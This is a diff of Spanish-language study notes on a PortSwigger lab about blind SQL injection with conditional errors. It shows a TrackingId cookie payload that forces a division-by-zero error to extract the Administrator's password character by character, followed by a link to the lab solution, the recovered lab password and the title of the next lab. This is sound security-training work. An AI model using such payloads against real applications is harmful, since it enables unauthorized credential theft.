@@ -102,3 +102,16 @@ y recibimos un 500 error (internal error) es muy probable que esa entrada sea vu
 Si la condicion: (username%3d'Administrator'+AND+SUBSTRING(Password,1,1)>'a') es "True" generara el error SQL de "division_by_zero"
 
 Cookie: TrackingId=i5Ar0xbNkgVZGzzzYYY'+AND+(SELECT+CASE+WHEN+(username%3d'Administrator'+AND+SUBSTRING(Password,1,1)>'a')+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+Users)%3d'a;
+
+
+6) leer las respuestas del lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+
+7) password: o6rsf9a9bxbqx6uudn6j
+
+oo6rsf9a9bxbqx6uudn6j
+
+
+
+
+
+        --> Lab: Blind SQL injection with time delays
